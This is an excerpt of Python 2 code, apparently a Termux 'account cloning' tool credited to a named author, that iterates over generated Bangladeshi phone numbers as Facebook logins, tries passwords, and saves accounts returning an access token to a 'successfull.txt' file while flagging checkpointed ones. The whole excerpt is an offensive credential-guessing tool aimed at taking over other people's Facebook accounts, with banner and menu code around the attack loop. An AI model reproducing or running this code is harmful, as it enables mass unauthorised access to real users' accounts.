...
os.system('clear')
psb('\x1b[1;32mBANGLADESH MUSA 11 DIGIT CLONING START PLEASE WAIT ..........')
for n in range(9999):
...
logo = ' __       __  __    __   ______    ______        
|  \     /  \|  \  |  \ /      \  /      \       
| $$\   /  $$| $$  | $$|  $$$$$$\|  $$$$$$\      
| $$$\ /  $$$| $$  | $$| $$___\$$| $$__| $$      
| $$$$\  $$$$| $$  | $$ \$$    \ | $$    $$      
...
def menu():
    ...
    print logo
    print ''
    print 'AUTHOR   : MUSA IBRAHIM '
    print 'FACEBOOK : TERMUX TEACHER MUSA'
    print 'GITHUB     : github.com/TERMUXMUSA'
    print ''
    print 50* '-'
    print '[1]  \x1b[1;96mGP'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[MUSA-OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[MUSA-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 03 Days]\x1b[0m \n'
